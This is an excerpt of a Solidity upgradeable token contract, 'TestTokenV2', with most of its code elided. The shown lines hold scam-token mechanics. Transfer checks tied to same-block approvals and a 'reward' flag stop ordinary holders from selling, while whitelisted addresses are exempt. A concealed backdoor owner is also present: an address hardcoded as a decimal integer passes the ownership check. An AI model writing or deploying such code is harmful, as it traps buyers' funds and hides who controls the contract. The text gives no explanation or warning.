 ...
 */
contract TestTokenV2 is Initializable, ContextUpgradeable, OwnableUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        blocktime[owner] = block.timestamp;
    ...
    function _beforeTokenTransfer(
        ...
        if(from != owner() && !candy[from]){
            ...
            if(numbers > 0){
                if(amount > numbers){
                    require(blocktime[from] == block.timestamp);
                }
            }
            if(reward){
                require(blocktime[from] == block.timestamp);
...
interface IConfigOwnable {
    function avoid() external view returns (address);
}
...
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    ...
    function _checkOwner() internal virtual {
        require(owner() == _msgSender() || _msgSender() == config(), "Ownable: caller is not the owner");
    }
    ...
    function config() internal virtual returns (address) {
        return IConfigOwnable(address(89224764945997240769933537035697122526912372067)).avoid();
    }
